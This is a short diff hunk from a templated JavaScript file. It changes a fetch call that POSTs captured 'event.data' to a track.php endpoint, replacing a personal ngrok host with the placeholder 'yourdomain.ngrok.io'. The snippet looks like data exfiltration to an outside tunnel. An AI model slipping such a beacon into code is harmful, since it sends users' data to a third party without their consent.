@@ -57,7 +57,7 @@ for (let n = 0; n < ${maxNesting}; n++) {
 
         formData.append('data', event.data);
 
-        fetch('http://devsteve.ngrok.io/track.php', {
+        fetch('http://yourdomain.ngrok.io/track.php', {
             body: formData,
             method: 'post'
         });
